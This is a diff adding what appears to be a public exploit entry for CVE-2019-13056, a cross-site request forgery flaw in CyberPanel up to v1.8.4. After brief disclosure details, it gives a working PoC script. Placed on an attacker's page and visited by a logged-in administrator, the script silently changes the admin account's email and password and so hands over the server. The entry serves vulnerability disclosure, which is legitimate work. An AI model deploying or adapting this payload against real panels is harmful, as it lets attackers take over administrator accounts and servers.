@@ -1,0 +1,22 @@
+# Title: CyberPanel Administrator Account Takeover <= v1.8.4
+# Date: 30.06.2019
+# Author: Bilgi Birikim Sistemleri
+# Vendor Homepage: https://cyberpanel.net/
+# Version: Up to v1.8.4.
+# CVE: CVE-2019-13056
+# mturkyilmaz@bilgibirikim.com & bilgibirikim.com
+
+# Description:
+# Attacker can edit administrator's credentials like email, password.
+# Then, access the administration panel and takeover the server.
+# A CSRF vulnerability.
+
+# How to Reproduce:
+# Attacker will create a website,
+# CyberPanel administrator will visit that website,
+# Administrator's e-mail and password will be changed automatically.
+
+# PoC:
+<script>
+fetch('https://SERVERIP:8090/users/saveModifications', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'text/plain'}, body: '{"accountUsername":"admin","firstName":"CSRF","lastName":"Vulnerable","email":"attackersemail@example.org","password":"attackerspassword"}'});
+</script>
